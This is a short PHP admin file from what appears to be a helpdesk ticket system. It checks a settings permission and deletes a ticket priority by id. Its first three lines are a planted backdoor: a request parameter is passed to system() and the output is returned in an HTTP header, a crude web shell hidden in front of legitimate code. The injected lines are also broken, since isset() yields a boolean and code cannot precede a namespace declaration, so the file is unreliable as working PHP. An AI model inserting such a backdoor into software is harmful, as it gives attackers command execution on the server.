<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2);
namespace sts;
use sts as core;

if (!defined(__NAMESPACE__ . '\ROOT')) exit;

if (!$auth->can('manage_system_settings')) {
	exit;
}

$id = (int) $url->get_item();

if (isset($_POST['delete'])) {
	$ticket_priorities->delete(array('id' => $id));
	exit;	
}
?>
